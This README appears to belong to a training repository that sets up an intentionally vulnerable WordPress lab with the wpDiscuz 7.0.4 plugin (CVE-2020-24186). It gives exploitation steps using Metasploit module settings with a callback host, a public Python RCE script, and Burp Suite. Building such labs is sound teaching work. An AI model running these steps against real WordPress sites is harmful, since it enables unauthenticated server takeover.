# WordPress Lab

This is a WordPress Lab version 5.2.7 with a plugin vulnerables named WPdiscuz version 7.0.4 with al well know vulnerability CVE-2020-24186. The idea of this repo is to have created a web vulnerable used in Red Team labs or cyberexercises.



## Deploy web with Docker 

`docker-compose up`


## It is vulnerable? 

```curl http:/localhost:8080/wp-content/plugins/wpdiscuz/readme.txt | head -n 10```

Check de wpdiscuzz version


## Option A - with Metasploit

Web Post as sample: http://localhost:8080/2025/01/20/fake2/


```
$ msfconsole 

search CVE-2020-24186
use 0


set RHOSTS <IP HOST>
set RPORT 8080 # or a different port

set BLOGPATH /2025/01/20/fake2/

set LHOST  <IP Localhost HOST>

```


## Option B - Using a python script



We will be using this [script](https://github.com/hev0x/CVE-2020-24186-wpDiscuz-7.0.4-RCE/tree/main)

`python wpDiscuz_RemoteCodeExec.py -u http://<IP HOST>:8080/ -p /2025/01/20/fake2/`

## Option C - Burp Suite 

https://ine.com/blog/vulnerability-lab-wordpress-plugin-wpdiscuz-unauthenticated-rce
